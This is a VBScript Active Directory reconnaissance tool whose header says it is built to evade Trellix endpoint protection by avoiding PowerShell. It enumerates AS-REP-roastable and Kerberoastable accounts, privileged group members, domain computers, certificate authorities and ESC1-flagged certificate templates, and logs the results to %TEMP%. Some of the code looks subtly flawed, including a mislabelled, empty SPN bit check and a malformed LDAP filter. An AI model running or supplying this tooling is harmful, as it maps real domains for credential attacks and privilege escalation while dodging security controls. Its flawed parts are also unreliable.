' ===============================================
' run_via_vbs.vbs - AD recon via VBScript + ADSI
' Bypasses PowerShell entirely (Trellix often only blocks PS1)
' Output: %TEMP%\ad_recon_vbs.log
' ===============================================
Const ForAppending = 8
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
strLogFile = strTemp & "\ad_recon_vbs.log"
Set objLog = objFSO.CreateTextFile(strLogFile, True)

Sub LogLine(s)
    objLog.WriteLine s
    WScript.Echo s
End Sub

LogLine "=== AD RECON via VBScript (Trellix bypass) ==="
LogLine "Time: " & Now
LogLine ""

' Get domain info via ADSI
LogLine "[1] Domain Info"
Set objRootDSE = GetObject("LDAP://RootDSE")
strDomain = objRootDSE.Get("defaultNamingContext")
LogLine "Domain: " & strDomain
LogLine "Forest: " & objRootDSE.Get("rootDomainNamingContext")
LogLine "DC: " & objRootDSE.Get("dnsHostName")
LogLine ""

' List all users
LogLine "[2] All Domain Users"
Set objConn = CreateObject("ADODB.Connection")
objConn.Provider = "ADsDSOObject"
objConn.Open "Active Directory Provider"
Set objRS = objConn.Execute("<LDAP://" & strDomain & ">;(objectCategory=user);samaccountname,userAccountControl,servicePrincipalName;SubTree")

intUserCount = 0
intSPNCount = 0
intNeverExpireCount = 0
intNoPreauthCount = 0

While Not objRS.EOF
    strSAM = objRS.Fields("samaccountname").Value
    intUAC = objRS.Fields("userAccountControl").Value
    intUserCount = intUserCount + 1

    ' Check SPN (bit 0x20000 = 2097152)
    If intUAC AND 2097152 Then
        ' Has SPN... but better check via SPN field
    End If

    ' Check DONT_EXPIRE_PASSWORD (0x10000 = 65536)
    If intUAC AND 65536 Then
        intNeverExpireCount = intNeverExpireCount + 1
        LogLine "  [NEVER-EXPIRE] " & strSAM
    End If

    ' Check DONT_REQUIRE_PREAUTH (0x400000 = 4194304)
    If intUAC AND 4194304 Then
        intNoPreauthCount = intNoPreauthCount + 1
        LogLine "  [AS-REP ROASTABLE] " & strSAM
    End If

    objRS.MoveNext
Wend

LogLine ""
LogLine "  Total users: " & intUserCount
LogLine "  Never-expire: " & intNeverExpireCount
LogLine "  No-preauth (AS-REP): " & intNoPreauthCount

objRS.Close
objConn.Close
LogLine ""

' SPN enumeration
LogLine "[3] Kerberoastable users (SPN > 0)"
Set objConn2 = CreateObject("ADODB.Connection")
objConn2.Provider = "ADsDSOObject"
objConn2.Open "Active Directory Provider"
Set objRS2 = objConn2.Execute("<LDAP://" & strDomain & ">;(objectCategory=user)(servicePrincipalName=*);samaccountname,servicePrincipalName,userAccountControl,pwdLastSet;SubTree")

While Not objRS2.EOF
    strSAM = objRS2.Fields("samaccountname").Value
    arrSPN = objRS2.Fields("servicePrincipalName").Value
    intUAC = objRS2.Fields("userAccountControl").Value
    strSPN = Join(arrSPN, ",")
    LogLine "  [KERBEROASTABLE] " & strSAM & " -> " & strSPN
    objRS2.MoveNext
Wend

objRS2.Close
objConn2.Close
LogLine ""

' Groups enumeration
LogLine "[4] Privileged groups (Domain Admins, etc.)"
strGroups = "Domain Admins,Enterprise Admins,Schema Admins,Account Operators,Backup Operators,Server Operators,Cert Publishers,DnsAdmins"
arrGroups = Split(strGroups, ",")
For Each strGroup In arrGroups
    LogLine ""
    LogLine "  --- " & strGroup & " ---"
    Set objConn3 = CreateObject("ADODB.Connection")
    objConn3.Provider = "ADsDSOObject"
    objConn3.Open "Active Directory Provider"
    Set objRS3 = objConn3.Execute("<LDAP://" & strDomain & ">;(memberOf=CN=" & strGroup & ",CN=Users," & strDomain & ");samaccountname;SubTree")
    While Not objRS3.EOF
        LogLine "    " & objRS3.Fields("samaccountname").Value
        objRS3.MoveNext
    Wend
    objRS3.Close
    objConn3.Close
Next
LogLine ""

' Computers
LogLine "[5] All domain computers"
Set objConn4 = CreateObject("ADODB.Connection")
objConn4.Provider = "ADsDSOObject"
objConn4.Open "Active Directory Provider"
Set objRS4 = objConn4.Execute("<LDAP://" & strDomain & ">;(objectCategory=computer);name,operatingsystem,operatingsystemservicepack;SubTree")

intCompCount = 0
While Not objRS4.EOF
    intCompCount = intCompCount + 1
    LogLine "  " & objRS4.Fields("name").Value & " | " & objRS4.Fields("operatingsystem").Value
    objRS4.MoveNext
Wend
objRS4.Close
objConn4.Close
LogLine "  Total computers: " & intCompCount
LogLine ""

' CAs
LogLine "[6] AD CS - Enterprise CAs"
Set objConn5 = CreateObject("ADODB.Connection")
objConn5.Provider = "ADsDSOObject"
objConn5.Open "Active Directory Provider"
Set objRS5 = objConn5.Execute("<LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration," & strDomain & ">;(objectCategory=pKIEnrollmentService);name,dnsHostName;SubTree")

While Not objRS5.EOF
    LogLine "  CA: " & objRS5.Fields("name").Value & " @ " & objRS5.Fields("dnsHostName").Value
    objRS5.MoveNext
Wend
objRS5.Close
objConn5.Close
LogLine ""

' Certificate Templates
LogLine "[7] Certificate Templates"
Set objConn6 = CreateObject("ADODB.Connection")
objConn6.Provider = "ADsDSOObject"
objConn6.Open "Active Directory Provider"
Set objRS6 = objConn6.Execute("<LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration," & strDomain & ">;(objectClass=pKICertificateTemplate);name,displayName,msPKI-Certificate-Name-Flag,flags;SubTree")

intTplCount = 0
While Not objRS6.EOF
    intTplCount = intTplCount + 1
    strName = objRS6.Fields("name").Value
    strDisplay = ""
    On Error Resume Next
    strDisplay = objRS6.Fields("displayName").Value
    On Error Goto 0
    
    intNameFlag = 0
    On Error Resume Next
    intNameFlag = objRS6.Fields("msPKI-Certificate-Name-Flag").Value
    On Error Goto 0
    
    intFlags = 0
    On Error Resume Next
    intFlags = objRS6.Fields("flags").Value
    On Error Goto 0
    
    strFlags = ""
    If intNameFlag AND 1 Then strFlags = strFlags & "[ESC1-SUBJECT]"
    If intFlags AND 1 Then strFlags = strFlags & "[ENROLLEE]"
    If intFlags AND 2 Then strFlags = strFlags & "[AUTOENROLL]"
    If intFlags AND 8 Then strFlags = strFlags & "[PEND]"
    
    LogLine "  " & strName & " (display: " & strDisplay & ")" & strFlags
    objRS6.MoveNext
Wend
objRS6.Close
objConn6.Close
LogLine "  Total templates: " & intTplCount
LogLine ""

LogLine "=== DONE ==="
LogLine "Log saved to: " & strLogFile
objLog.Close

WScript.Echo ""
WScript.Echo "Log file: " & strLogFile
WScript.Echo "Press Enter to exit..."
WScript.StdIn.ReadLine
